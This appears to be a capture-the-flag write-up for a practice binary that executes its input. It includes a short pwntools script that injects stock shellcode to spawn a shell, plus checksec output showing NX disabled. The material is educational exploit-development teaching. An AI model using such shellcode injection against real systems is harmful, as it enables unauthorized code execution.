The binary uses gets to input up to 500 bytes, then executes them. While gets is
unsafe, we cannot easily exploit it due to stack canaries. However, this doesn't
matter since the binary is just executing the data we give it. That means that
if we give it some code that creats a shell for us (often called shellcode), we
can get the flag. The easiest way to get shellcode is just to copy it from
online. pwntools includes tons of different types of shellcode.

```python
from pwn import *
context.binary = 'shellysellsshells'
p = process('shellysellsshells')
p.sendline(asm(shellcraft.sh()))
p.interactive()
```

The `context.binary` is important so pwntools knows if we are using a 32 or 64
bit binary, so it can select the right shellcode.

The `shellcraft.sh()` call returns a string of assembly, so feel free to look at
it to see how it works. If you ever need to write custom shellcode, the pwntools
shellcode is often a good place to start. The `asm` function compiles the
assembly into machine code.

This sort of exploit only works if a feature called "NX" is disabled on the
binary. We can check if NX is disabled by running `pwn checksec
shellysellsshells`

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

If NX is enabled, the stack is marked as non executable. This means that even if
we jump to code on the stack, the binary will refuse to run it. Because of this,
shellcode can only really be used if the problem writer turned off NX.
